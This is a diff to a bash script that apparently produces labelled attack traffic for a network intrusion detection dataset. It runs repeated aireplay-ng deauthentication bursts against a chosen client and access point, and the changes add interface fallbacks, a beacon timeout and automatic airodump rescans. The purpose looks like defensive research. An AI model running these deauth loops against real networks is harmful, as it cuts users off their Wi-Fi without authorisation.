@@ -28,9 +28,23 @@ _cleanup_label() {
 }
 trap _cleanup_label EXIT
 
+# ath9k / iw path may leave monitor on wlan0 (not wlan0mon)
 if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
-  echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
-  bash "${DIR}/prepare_wifi.sh" monitor
+  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
+  if [[ -n "${_alt:-}" ]]; then
+    echo ">>> Using monitor iface ${_alt} (not ${MON_IFACE})"
+    MON_IFACE="$_alt"
+    export NIDS_MON_IFACE="$_alt"
+  else
+    echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
+    bash "${DIR}/prepare_wifi.sh" monitor
+    # prepare_wifi exports NIDS_MON_IFACE; re-read
+    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
+  fi
+fi
+if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
+  echo ">>> ERROR: no monitor iface. Run: iw dev; export NIDS_MON_IFACE=..." >&2
+  exit 1
 fi
 
 # Label path first — do not START if Kali cannot reach collector host
@@ -95,13 +109,21 @@ LABEL_SENT=1
 sleep 0.5
 
 run_aireplay_batch() {
-  # Capture aireplay; return 99 if "No such BSSID", else aireplay rc.
+  # Capture aireplay; return 99 if "No such BSSID", 98 if timeout waiting for beacon.
   # Default: quiet (one summary line). NIDS_VERBOSE=1 prints full aireplay spam.
+  # Phone APs: wrong channel/BSSID → aireplay hangs on "Waiting for beacon"; cap wait.
   local out rc=0
+  local wait_sec="${NIDS_AIREPLAY_TIMEOUT:-20}"
   set +e
-  out="$(aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE" 2>&1)"
+  out="$(timeout "$wait_sec" aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE" 2>&1)"
   rc=$?
   set -e
+  if [[ "$rc" -eq 124 ]]; then
+    echo ">>> aireplay: TIMEOUT ${wait_sec}s (waiting for beacon?) — wrong channel/BSSID?"
+    echo ">>>   unset NIDS_BSSID NIDS_WIFI_CHANNEL  # then re-run to auto-airodump"
+    echo ">>>   or: sudo airodump-ng ${MON_IFACE} --essid ${SSID}"
+    return 98
+  fi
   if [[ "${NIDS_VERBOSE:-0}" == "1" ]]; then
     printf '%s\n' "$out"
   else
@@ -134,8 +156,9 @@ for ((i=1; i<=repeats; i++)); do
   batch_rc=$?
   set -e
 
-  if [[ "$batch_rc" -eq 99 && "$rescanned" -eq 0 && "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
-    echo ">>> aireplay: No such BSSID — auto airodump refresh + retry batch" >&2
+  if [[ ("$batch_rc" -eq 99 || "$batch_rc" -eq 98) && "$rescanned" -eq 0 && "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
+    echo ">>> aireplay failed (rc=${batch_rc}) — clearing forced BSSID, airodump refresh + retry" >&2
+    unset NIDS_BSSID NIDS_WIFI_CHANNEL
     if hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
       BSSID="${hit%% *}"
       CHANNEL="${hit##* }"
@@ -151,8 +174,8 @@ for ((i=1; i<=repeats; i++)); do
     fi
   fi
 
-  if [[ "$batch_rc" -eq 99 ]]; then
-    echo ">>> ERROR: still No such BSSID after rescan. Check SSID='${SSID}' / USB Wi-Fi." >&2
+  if [[ "$batch_rc" -eq 99 || "$batch_rc" -eq 98 ]]; then
+    echo ">>> ERROR: aireplay still failing (rc=${batch_rc}). Check SSID='${SSID}' / USB Wi-Fi / channel." >&2
     exit 1
   fi
   if [[ "$batch_rc" -ne 0 ]]; then
